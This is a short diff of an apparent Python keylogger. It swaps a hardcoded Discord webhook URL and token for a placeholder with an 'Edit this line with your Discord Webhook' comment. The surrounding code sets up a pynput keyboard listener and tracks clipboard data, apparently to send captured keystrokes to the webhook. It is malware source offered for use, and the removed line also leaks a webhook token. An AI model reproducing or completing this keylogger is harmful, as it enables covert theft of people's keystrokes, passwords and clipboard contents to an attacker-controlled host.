@@ -20,8 +20,7 @@ class KeyLogger:
         is_win, is_lin, data, count, data_max_len, clipboard_data = is_windows, is_linux, "", 0, 30, "-"
 
         ## Enter your webhook here
-        webhook = "https://discord.com/api/webhooks/711698886233948210/hxK6uPXhkOh" \
-                  "-G0Q6Nc5JzmNgLHlx1s36zY3dA8yUBuwkYSi7LctMdSSgY-wRqPcIIx8L"
+        webhook = "https://discord.com/api/webhooks/..." # Edit this line with your Discord Webhook
         ## Enter your webhook above
 
         with pynput.keyboard.Listener(on_press=self.detectKey) as listener:
